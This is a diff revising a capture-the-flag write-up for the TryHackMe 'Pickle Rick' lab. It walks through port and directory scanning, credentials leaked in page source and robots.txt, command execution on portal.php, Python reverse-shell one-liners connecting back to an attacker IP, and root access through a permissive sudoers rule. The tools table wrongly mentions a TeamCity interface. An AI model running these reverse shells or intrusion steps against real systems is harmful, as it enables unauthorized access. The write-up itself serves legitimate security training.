@@ -1,98 +1,163 @@
-# Rick and Morty — TryHackMe
+# PickleRick - TryHackMe — CTF Writeup
 
-- **OS:** Linux
-- **IP:** 10.113.185.115
-- **Status:** ✅ Pwned
+-   **OS:** Linux
+-   **Target IP:** `10.113.185.115`
+
+------------------------------------------------------------------------
 
 ## Enumeration
 
-Starting with a port scan using [Nmap](./tools/nmap.md):
-```bash
+### Nmap Scan
+
+Starting with a service and port scan using Nmap:
+
+``` bash
 nmap -sC -sV -A 10.113.185.115
 ```
 
-Only ports 22 (SSH) and 80 (HTTP) are open.
+**Output:**
 
-Inspecting the DOM of the main page I find a comment revealing a username:
-```html
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
+    80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
+    |_http-title: Rick is sup4r cool
+
+Two open ports were found:
+
+-   **22** --- SSH
+-   **80** --- Apache HTTP server running on Ubuntu
+
+------------------------------------------------------------------------
+
+### Web Inspection
+
+Inspecting the page source reveals a hidden comment with a username:
+
+``` html
 <!-- Note to self, remember username! Username: R1ckRul3s -->
 ```
 
-Proceeding with directory enumeration using [Ffuf](./tools/ffuf.md):
-```bash
-ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.113.185.115/FUZZ -e .php,.txt,.html,.bak -fs 279 -t 100 2>/dev/null
+------------------------------------------------------------------------
+
+### Directory Fuzzing
+
+Proceeding with directory enumeration using ffuf:
+
+``` bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt      -u http://10.113.185.115/FUZZ      -e .php,.txt,.html,.bak      -fs 279      -t 100 2>/dev/null
 ```
 
-Found: `login.php` and `robots.txt`.
+**Output:**
 
-Inside `robots.txt` I find the string `Wubbalubbadubdub`, which looks like a password.
+    assets      [Status: 301]
+    denied.php  [Status: 302]
+    index.html  [Status: 200]
+    login.php   [Status: 200]
+    portal.php  [Status: 302]
+    robots.txt  [Status: 200]
 
-Trying the credentials on `login.php`:
-- **Username:** R1ckRul3s
-- **Password:** Wubbalubbadubdub
+The most interesting findings are:
 
-Access granted.
+-   `login.php`
+-   `robots.txt`
 
-## Exploit
+Inside `robots.txt` the string `Wubbalubbadubdub` is present, which
+appears to be a password.
 
-After logging in I'm redirected to `portal.php`, which contains a command input field — a Remote Code Execution vulnerability.
+------------------------------------------------------------------------
 
-Running `ls` I can see the following files:
-```
-Sup3rS3cretPickl3Ingred.txt
-assets
-clue.txt
-denied.php
-index.html
-login.php
-portal.php
-robots.txt
-```
+## Exploitation
 
-Trying `cat Sup3rS3cretPickl3Ingred.txt` returns "access denied", so I check if Python3 is available to spawn a reverse shell:
-```bash
-find / -name "python3" 2>/dev/null
-```
+### Initial Access
 
-Python3 is available. Setting up a [Reverse shell](./tools/reverse-shell.md):
-```bash
-# on my machine
+Using discovered credentials on `login.php`:
+
+-   **Username:** R1ckRul3s\
+-   **Password:** Wubbalubbadubdub
+
+Authentication succeeds and redirects to `portal.php`, which contains a
+command input field vulnerable to Remote Code Execution.
+
+Running `ls` reveals:
+
+    Sup3rS3cretPickl3Ingred.txt
+    assets
+    clue.txt
+    denied.php
+    index.html
+    login.php
+    portal.php
+    robots.txt
+
+Attempting to read the ingredient directly results in access denied, so
+a reverse shell is required.
+
+------------------------------------------------------------------------
+
+### Reverse Shell
+
+Setting up a listener on the attacker machine:
+
+``` bash
 nc -lvnp 4444
-
-# on the target via the command input
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
 
-Once inside I check the current user:
-```bash
+Finding the attacker THM network IP:
+
+``` bash
+ip a
+# 192.168.142.170
+```
+
+Launching the reverse shell from the portal input:
+
+``` bash
+python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("192.168.142.170",4444));[os.dup2(s.fileno(),i)for i in range(3)];pty.spawn("/bin/bash")'
+```
+
+Reverse shell obtained successfully.
+
+Checking current user:
+
+``` bash
 whoami
 # www-data
 ```
 
-As `www-data` I can now read the first ingredient:
-```bash
+Reading the first ingredient:
+
+``` bash
 cat Sup3rS3cretPickl3Ingred.txt
 # mr. meeseek hair
 ```
 
-Navigating to `/home/rick` I find the second ingredient:
-```bash
+Navigating to Rick's home directory:
+
+``` bash
 cat '/home/rick/second ingredients'
 # 1 jerry tear
 ```
 
+------------------------------------------------------------------------
+
 ## Privilege Escalation
 
 Checking sudo permissions:
-```bash
+
+``` bash
 sudo -l
-# (ALL) NOPASSWD: ALL
 ```
 
-`www-data` can run any command as root without a password — a critical misconfiguration in `/etc/sudoers`.
+**Output:**
 
-Navigating to `/root`:
-```bash
+    (ALL) NOPASSWD: ALL
+
+The `www-data` user can execute any command as root without a password
+due to a misconfigured `/etc/sudoers`.
+
+Accessing the root directory:
+
+``` bash
 sudo ls /root
 # 3rd.txt
 
@@ -100,20 +165,15 @@ sudo cat /root/3rd.txt
 # 3rd ingredients: fleeb juice
 ```
 
-## Flags
+Root access successfully obtained.
 
-| Ingredient | Location | Value |
-|---|---|---|
-| 1st | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` | mr. meeseek hair |
-| 2nd | `/home/rick/second ingredients` | 1 jerry tear |
-| 3rd | `/root/3rd.txt` | fleeb juice |
+------------------------------------------------------------------------
 
-## Tools Used
-- [Nmap](./tools/nmap.md)
-- [Ffuf](./tools/ffuf.md)
-- [Netcat](./tools/reverse-shell.md)
+## Tools Summary
 
-## Lessons Learned
-- Always inspect the DOM source code for hidden comments
-- `robots.txt` can contain sensitive information
-- A misconfigured `/etc/sudoers` with `NOPASSWD: ALL` gives immediate root access
+| Tool | Purpose | Usage |
+|------|---------|-------|
+| Nmap | Network scanner | Port discovery and service/version detection |
+| ffuf | Web fuzzer | Directory and file enumeration on the TeamCity web interface |
+| Netcat | Listener | Reverse shell connection |
+| Python3 | Exploitation | Reverse shell execution |
